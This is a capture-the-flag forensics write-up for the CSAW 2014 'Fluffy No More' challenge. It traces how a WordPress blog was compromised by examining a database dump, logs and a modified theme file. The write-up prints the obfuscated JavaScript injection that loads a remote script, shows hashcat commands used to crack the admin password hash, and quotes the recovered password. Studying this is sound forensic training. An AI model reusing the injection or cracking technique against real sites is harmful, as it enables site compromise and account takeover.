# Forensics-300: Fluffy No More

This is the fourth and the last forensics challenge in the CSAW CTF 2014 competition. I think it was much harder than any of the three before it, but it's also much more interesting. 

The challenge stars with the following text:


> OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. 
> Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??
>
>Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!
>
>Written by brad_anton
>
> [CSAW2014-FluffyNoMore-v0.1.tar.bz2]

Oh, no! Nobody should mess with fluffy bunnies! Ever! Let's find how this attack happened!


## Inspecting the Directories

We start by checking the identity of the file with the command [file]. We do this to make sure that the extension is not misleading:
```sh
$ file CSAW2014-FluffyNoMore-v0.1.tar.bz2 
CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block size = 900k

```

OK, cool, we can go ahead and unzip the *bzip2* (compressed) tarball:

```sh
$ tar --help | grep bz
  -j, --bzip2                filter the archive through bzip2
$ tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2 
```
Now, let's take a look inside the folder:
```sh
$ tree CSAW2014-FluffyNoMore-v0.1
CSAW2014-FluffyNoMore-v0.1
├── etc_directory.tar.bz2
├── logs.tar.bz2
├── mysql_backup.sql.bz2
└── webroot.tar.bz2

0 directories, 4 files
``` 

All right, 4 more tarballs. Unzip and organizing them, gives us the following directories:

    - etc/
    - var/log and var/www
    - mysql_backup.sql ([MySQL database dump file])


This is the directory structure of a  [LAMP server], where LAMP stands for Linux-Apache-MySQL-PHP in the [Linux File System]. In this framework, the PHP/HTML/JavaScript webpage is placed inside ```var/www```.

The directory ```var/``` contains files that are expected to change in size and content as the system is running (var stands for variable). So it is natural that system log files are generally placed at ```/var/log```.


 Finally, the ```etc/``` directory contains the system configuration files. For example, the file ```resolv.conf``` tells the system where to go on the network to obtain host name to IP address mappings (DNS), or the file  ```passwd``` stores login information.

---

## Life is Made of Futile Tries

OK,  before anything, we need to give a chance:
```sh
$ grep -r -l "key{" 
var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css

$ grep -r -l "flag{" 
var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
```

 Is our life this easy??? No, of course not. The hits we got are just funny names to mislead us, for example:
```html
 -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px 
```

---
## Analyzing the MySQL Dump File

Let's start taking a look at ```mysql_backup.sql```.

Of course, no luck for:

```sh
$ cat mysql_backup.sql | grep 'flag{'
```

Fine. We open ```mysql_backup.sql``` in a text editor. The comments table shows that someone named "hacker" made an appearance:


```mysql
-- MySQL dump 10.13  Distrib 5.5.38, for debian-linux-gnu (i686)
--
-- Host: localhost    Database: wordpress
-- ------------------------------------------------------

-- Dumping data for table `wp_comments`
--
(..)

(4,5,'Hacker','hacker@secretspace.com','','192.168.127.130','2014-09-16 14:21:26','2014-09-16 14:21:26','I HATE BUNNIES AND IM GOING TO HACK THIS SITE BWHAHAHAHAHAHAHAHAHAHAHAH!!!!!!! BUNNIES SUX',0,'1','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0','',0,0),

(7,5,'Bald Bunny','nohair@hairlessclub.com','','192.168.127.130','2014-09-16 20:47:18','2014-09-16 20:47:18','I find this blog EXTREMELY OFFENSIVE!',0,'1','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0','',0,0),

(8,5,'MASTER OF DISASTER','shh@nottellin.com','','192.168.127.137','2014-09-17 19:40:57','2014-09-17 19:40:57','Shut up baldy',0,'1','Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko','',7,0);
(...)
```

So we have the (possible) **attacker's email** and **IP address**. Maybe we can try to find a bit more about  her.

Unfortunately the IP  leads to nowhere:
```sh
$ ping 192.168.127.130
PING 192.168.127.130 (192.168.127.130) 56(84) bytes of data.
^C
--- 192.168.127.130 ping statistics ---
160 packets transmitted, 0 received, 100% packet loss, time 158999ms

$ nmap -A -v 192.168.127.130
Starting Nmap 6.45 ( http://nmap.org ) at 2014-09-25 15:43 EDT
NSE: Loaded 118 scripts for scanning.
NSE: Script Pre-scanning.
Initiating Ping Scan at 15:43
Scanning 192.168.127.130 [2 ports]
Completed Ping Scan at 15:43, 3.00s elapsed (1 total hosts)
Nmap scan report for 192.168.127.130 [host down]
NSE: Script Post-scanning.
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.13 seconds
```

Searching for the host **secretspace.com** leads to some generic website. Inspecting its source code does not give us any hint either. Maybe its IP address?

```sh
$ dig secretspace.com

; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> secretspace.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 61131
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;secretspace.com.       IN  A

;; ANSWER SECTION:
secretspace.com.    285 IN  A   72.167.232.29

;; Query time: 7 msec
;; SERVER: 10.0.0.1#53(10.0.0.1)
;; WHEN: Thu Sep 25 15:51:26 EDT 2014
;; MSG SIZE  rcvd: 49
```

The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the sourcecode. Wrong direction...


All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use [phpMyAdmin], which I showed how to install and configure in my tutorial about setting up a [LAMP server]. 

We open ```localhost/phpmyadmin``` in our browser. First we go  to *Databases* and then *Create Database* with any name we want. Then we  *Import* ```mysql_backup.sql`` to this database. All the tables are loaded. Let's use the *Search* option to look for *key* or *flag*.


![](http://i.imgur.com/tVOY1VJ.png)
![](http://i.imgur.com/jY7CbLZ.png)

Nope. Nothing in special. By the way, ```default_pingback_flag1`` is just a **Wordpress** flag indicating the default status of ping backs when new blog posts are published. 

Continuing our searc, if we look inside inside each of the tables we find:
   -  The URL for the [blog], which doesn't render. However, in the source code, there is a commented link that leads to a [cute website]. Nothing else.
   - A hashed password!
![](http://i.imgur.com/FiQONze.png)

---
## Cracking the Password

We want to unhash ```$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1``` and for this we are going to use [hashcat]. If you are in [Kali] or in any Debian distribution you can install it with:
```sh
$ apt-get hashact
```

In Fedora, we need to download and unzip it:
```sh
$ wget http://hashcat.net/files/hashcat-0.47.7z
$ 7za e hashcat-0.47.7z 
```

Now, we are going to perform a brute force attack so we need a list of passwords. If you are using Kali, you can find them with:

```sh
$ locate wordlist
```
If this is not the case, this is an example for you (it's allways good to have several lists!):
```sh
$ wget http://www.scovetta.com/download/500_passwords.txt
$ head 500_passwords.txt 
123456
password
12345678
1234
pussy
12345
dragon
qwerty
696969
mustang
```

Hashcat is awesome because it gives you a list of hash types:

```
    0 = MD5
   10 = md5($pass.$salt)
   20 = md5($salt.$pass)
   30 = md5(unicode($pass).$salt)
   40 = md5(unicode($pass).$salt)
   50 = HMAC-MD5 (key = $pass)
   60 = HMAC-MD5 (key = $salt)
  100 = SHA1
  110 = sha1($pass.$salt)
  120 = sha1($salt.$pass)
  130 = sha1(unicode($pass).$salt)
  140 = sha1($salt.unicode($pass))
  150 = HMAC-SHA1 (key = $pass)
  160 = HMAC-SHA1 (key = $salt)
  200 = MySQL
  300 = MySQL4.1/MySQL5
  400 = phpass, MD5(Wordpress), MD5(phpBB3)
  500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5
  800 = SHA-1(Django)
  (...)
```

We choose 400 because we are dealing with Wordpress. We copy and paste the hash to a file *pass.hash*. Then, we run:
```sh
$ ./hashcat-cli64.bin -m 400 -a 0 -o cracked.txt --remove  pass.hash word_list.txt 

Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...

Added hashes from file crack1.hash: 1 (1 salts)
Activating quick-digest mode for single-hash with salt

NOTE: press enter for status-screen


All hashes have been recovered

Input.Mode: Dict (500_passwords.txt)
Index.....: 1/1 (segment), 1 (words), 14 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, - words
Progress..: 1/1 (100.00%)
Running...: 00:00:00:01
Estimated.: --:--:--:--

Started: Thu Sep 25 18:25:49 2014
Stopped: Thu Sep 25 18:25:50 2014

```
where:

   * -m is for --hash-type=NUM
   * -a 0: Using a dictionary attack 
   * cracked.txt is the output file
   * word_list.txt is our dictionary


Now let's take a peak in the output file:

```sh
$ cat cracked.txt 
$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1:fluffybunnies
```

It worked! Our password is **fluffybunnies**!

All right, this is a very silly password! It could be easy guessed. If you were the attacker, wouldn't you try this as the first option ? OK, maybe right after *password* and *123456*...


#### What we have so far
In conclusion, all we have learned from this file was  the attacker's motivation, the blog's URL, that the application was in Wordpress, and a password. Ah,  also that ```mailserver_login:login@example.com``` and ```mailserver_pass=password```. Talking about security... Let's move on.

---
## Inspecting /var/logs/apache2

The next item in the list is log inspection:

```sh
$ find . -type f  -name '*.log'
./apache2/error.log
./apache2/access.log
./apache2/other_vhosts_access.log
./fontconfig.log
./boot.log
./gpu-manager.log
./mysql.log
./bootstrap.log
./pm-powersave.log
./kern.log
./mysql/error.log
./alternatives.log
./lightdm/x-0.log
./lightdm/lightdm.log
./casper.log
./auth.log
./apt/term.log
./apt/history.log
./dpkg.log
./Xorg.0.log
./upstart/container-detect.log
./upstart/console-setup.log
./upstart/mysql.log
./upstart/alsa-state.log
./upstart/network-manager.log
./upstart/whoopsie.log
./upstart/procps-virtual-filesystems.log
./upstart/cryptdisks.log
./upstart/systemd-logind.log
./upstart/procps-static-network-up.log
./upstart/alsa-restore.log
./upstart/modemmanager.log
```


 If there is any important information in the log files, it should appears in the end of it, because the attack should be one of the last things that were logged. [Tailing] the *apache* logs did not reveal anything useful. Maybe it is interesting to know that we see the IP *192.168.127.137* in the file */apache2/access.log*, which belongs to *MASTER OF DISASTER* (see above). So *hacker* was not the attacker?


-----
## Inspecting var/logs/auth.log


Now, considering that the password **fluffybunnies** was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted. Tailing ```auth.log``` shows something interesting:

```sh
Sep 17 19:18:53 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chmod -R 775 /var/www/
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
Sep 17 19:20:55 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/find /var/www/html/ * touch {}
```
So someone logged as root and:
 1. downgraded the permissions of */var/www* (755 means read and execute access for everyone and also write access for the owner of the file), and
 2. modified a JavaScript file (html5.js) in *vi*.

---
## Finding the JavaScript Exploit


It looks like an attack to me! Let's [diff] this JavaScript file with the original ([which we can just google]):


```sh
$ diff html5.js html5_normal.js 
93,122d92
< var g = "ti";
< var c = "HTML Tags";
< var f = ". li colgroup br src datalist script option .";
< f = f.split(" ");
< c = "";
< k = "/";
< m = f[6];
< for (var i = 0; i < f.length; i++) {
<     c += f[i].length.toString();
< }
< v = f[0];
< x = "\'ht";
< b = f[4];
< f = 2541 * 6 - 35 + 46 + 12 - 15269;
< c += f.toString();
< f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
< c += f.toString();
< f = "";
< c = c.split("");
< var w = 0;
< u = "s";
< for (var i = 0; i < c.length; i++) {
<     if (((i == 3 || i == 6) && w != 2) || ((i == 8) && w == 2)) {
<         f += String.fromCharCode(46);
<         w++;
<     }
<     f += c[i];
< }
< i = k + "anal";
< document.write("<" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\'>\</" + m + "\>");

```
Aha!!! So what is being written?

In JavaScript, the function ```document.write()``` writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to ```console.log()``` (and changing any ```document``` word to ```console```). To run JavaScript in the console, you need to install [Node]:
```sh
$ node html5.js 
<script src='http://128.238.66.100/analytics.js'></script>
```
----

## Analyzing the Second JavaScript Exploit

Awesome, we see a script exploit! Let's get it!

```sh
$  wget http://128.238.66.100/analytics.js
--2014-09-25 19:17:19--  http://128.238.66.100/analytics.js
Connecting to 128.238.66.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16072 (16K) [application/javascript]
Saving to: ‘analytics.js’

100%[===============================================================================>] 16,072      --.-K/s   in 0.008s  

2014-09-25 19:17:19 (2.02 MB/s) - ‘analytics.js’ saved [16072/16072]
```


The file turns out to be large, and *grep* *flag* or *key* doesn't give any result back. No IP addresses or URL neither. 

OK, let's take a closer look at it. We open the file in a text editor and we found a weird hex-encoded variable that is completely unconnected from the rest:
```
var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
window[_0x91fe[2]](_0x91fe[0], _0x91fe[1]);
```

We decode it using Python or a [online hex-decode]:
```python
>>> print("\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E")
('http://128.238.66.100/announcement.pdf', '_self', 'open')
```

OK, another file. Opening the URL leads to this picture:
![](http://i.imgur.com/CNEQhfG.png)


No flag yet... But it should be in the PDF somewhere!

___
## Finding the Second Hex-encoded String: Approach I


All right, let's use what we learned from the [CSAW CTF 2014 Forensic -Obscurity] problem. First, let's see if we find the flag with a simple grep:
```sh
$./pdf-parser.py announcement.pdf | grep flag
$./pdf-parser.py announcement.pdf | grep key
```

No luck. Let us ID the file to see if we find any funny stream:

```sh
$ ./pdfid.py announcement.pdf PDFiD 0.1.2 announcement.pdf
 PDF Header: %PDF-1.4
 obj                    9
 endobj                 9
 stream                 4
 endstream              4
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    0
 /JavaScript            0
 /AA                    0
 /OpenAction            0
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          1
 /XFA                   0
 /Colors > 2^24         0
```

Oh, cool, there is a **Embedded File**! Let's look closer to this object:
```sh
$ ./pdf-parser.py --stats announcement.pdf Comment: 3
XREF: 1
Trailer: 1
StartXref: 1
Indirect object: 9
  2: 3, 7
 /Catalog 1: 6
 /EmbeddedFile 1: 8
 /Filespec 1: 9
 /Page 1: 5
 /Pages 1: 4
 /XObject 2: 1, 2
```

 Nice. So now we can decode our pdf file using the **object code**, which we can see  above that is **8**:

```sh
$ ./pdf-parser.py --object 8 --raw --filter announcement.pdf 
obj 8 0
 Type: /EmbeddedFile
 Referencing: 
 Contains stream

  <<
    /Length 212
    /Type /EmbeddedFile
    /Filter /FlateDecode
    /Params
      <<
        /Size 495
        /Checksum <7f0104826bde58b80218635f639b50a9>
      >>
    /Subtype /application/pdf
  >>

 var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];

```
Which *finally* leads to our flag!
```python
>>> print("\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D")
YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}
```

---
## Finding the Second Hex-encoded String: Approach II

There is a nice tool called [qpdf] that can be very useful here:
```sh
$ sudp yum install qpf
```

Now, we just do the following conversion:
```sh
$ qpdf  --qdf  announcement.pdf  unpacked.pdf
```

Opening *unpacket.pdf* with [l3afpad] also leads to the flag :

```
stream
var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
endstream
endobj
````


--------------
**That's it! Hack all the things!**



[MySQL database dump file]:http://dev.mysql.com/doc/refman/5.0/en/mysqldump-sql-format.html
[online hex-decode]: http://ddecode.com/hexdecoder/
[which we can just google]: http://phpxref.ftwr.co.uk/wordpress/wp-content/themes/twentythirteen/js/html5.js.source.html
[Tailing]: http://en.wikipedia.org/wiki/Tail_(Unix)
[phpMyAdmin]: http://www.phpmyadmin.net/home_page/index.php
[qpdf]: http://qpdf.sourceforge.net/
[l3afpad]: http://tarot.freeshell.org/leafpad/
[diff]: http://linux.die.net/man/1/diff
[MySQL database dump file]: http://dev.mysql.com/doc/refman/5.1/en/mysqldump.html
[Linux File System]: http://www.tldp.org/LDP/intro-linux/html/sect_03_01.html
[LAMP server]: https://coderwall.com/p/syyk0g?i=5&p=1&q=author%3Abt3gl&t%5B%5D=bt3gl
[CSAW2014-FluffyNoMore-v0.1.tar.bz2]: https://ctf.isis.poly.edu/static/uploads/649bdf6804782af35cb9086512ca5e0d/CSAW2014-FluffyNoMore-v0.1.tar.bz2
[bzip2]: http://en.wikipedia.org/wiki/Bzip2
[cute website]: http://ww17.blog.eyeheartfluffybunnies.com/?fp=Tnxj5vWdcChO2G66EhCHHqSAdskqgQmZEbVQIh1DCmrgCyQjbeNsPhkvCpIUcP19mwOmcCS1hIeFb9Aj3%2FP4fw%3D%3D&prvtof=RyfmkPY5YuWnUulUghSjPRX510XSb9C0HJ2xsUn%2Fd3Q%3D&poru=jcHIwHNMXYtWvhsucEK%2BtSMzUepfq46Tam%2BwGZBSFMjZiV2p3eqdw8zpPiLr76ixCoirz%2FR955vowRxEMBO%2FoQ%3D%3D&cifr=1&%22
[blog]: http://ww17.blog.eyeheartfluffybunnies.com
[hashcat]: http://hashcat.net/hashcat/
[file]: http://en.wikipedia.org/wiki/File_(command)
[Kali]: http://www.kali.org/
[Node]: http://nodejs.org/